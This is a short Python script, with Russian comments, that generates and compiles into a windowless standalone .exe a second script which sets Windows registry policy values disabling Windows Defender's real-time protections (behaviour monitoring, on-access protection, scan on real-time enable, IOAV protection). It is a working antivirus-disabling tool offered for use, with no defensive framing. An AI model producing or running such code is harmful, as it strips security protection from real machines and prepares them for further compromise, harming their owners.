import subprocess
import sys
import os

def compile_to_exe(script_path):
    # Проверяем наличие pyinstaller
    try:
        import PyInstaller  # noqa: F401
    except ImportError:
        print("PyInstaller не установлен, устанавливаю...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
    
    # Компилируем скрипт в .exe
    subprocess.run([
        sys.executable,
        "-m",
        "PyInstaller",
        "--onefile",
        "--windowed",
        script_path
    ], check=True)
    
    print("Компиляция завершена. Найдите .exe в папке dist.")

if __name__ == "__main__":
    # Замените 'your_script.py' на имя вашего файла с кодом
    script_file = "your_script.py"
    if not os.path.isfile(script_file):
        print(f"Файл {script_file} не найден, создаю...")
        with open(script_file, "w", encoding="utf-8") as f:
            f.write('''import winreg

def create_registry_key_and_values():
    path = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
    dword_values = [
        "DisableBehaviourMonitoring",
        "DisableOnAccessProtection",
        "DisableScanOnRealTimeEnable",
        "DisableIOAVPProtection"
    ]

    try:
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, path)
        for name in dword_values:
            winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        print("Раздел и параметры успешно созданы.")
    except PermissionError:
        print("Ошибка: Запустите скрипт с правами администратора.")
    except Exception as e:
        print(f"Ошибка: {e}")

if __name__ == "__main__":
    create_registry_key_and_values()
''')
    compile_to_exe(script_file)
